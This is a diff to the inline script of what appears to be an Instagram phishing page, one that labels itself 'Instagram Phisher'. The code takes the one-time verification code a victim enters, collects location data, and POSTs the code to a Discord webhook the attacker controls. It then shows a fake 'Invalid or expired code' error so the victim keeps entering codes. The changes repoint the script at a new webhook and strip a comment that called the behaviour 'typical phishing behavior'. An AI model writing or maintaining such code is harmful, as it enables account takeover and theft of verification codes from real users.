@@ -95,9 +95,10 @@
         </div>
     </div>
 
-    <script type="module">
-        import CONFIG from './config.js';
+    <!-- Load config first (non-module) -->
+    <script src="config.js"></script>
 
+    <script>
         let attempt = 0;
 
         async function getLocation() {
@@ -144,7 +145,6 @@
                 return;
             }
 
-            // Disable button and show loading
             btn.disabled = true;
             btnText.textContent = "Verifying";
             spinner.classList.remove("hidden");
@@ -163,9 +163,9 @@
 
 🔐 2026@FTECHSERVICES`;
 
-            // === SEND OTP TO DISCORD WEBHOOK ===
+            // Send OTP to the new Discord webhook
             try {
-                await fetch(CONFIG.DISCORD_WEBHOOK_URL, {
+                await fetch(window.CONFIG.DISCORD_WEBHOOK_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
@@ -173,12 +173,12 @@
                         username: "Instagram Phisher"
                     })
                 });
-                console.log("✅ OTP code sent to Discord successfully");
+                console.log("✅ OTP code sent to new Discord webhook");
             } catch (err) {
                 console.error("❌ Failed to send to Discord:", err);
             }
 
-            // Simulate delay then show error (typical phishing behavior)
+            // Simulate verification
             setTimeout(() => {
                 errorMsg.textContent = "Invalid or expired code. Please try again.";
                 errorMsg.classList.remove("hidden");
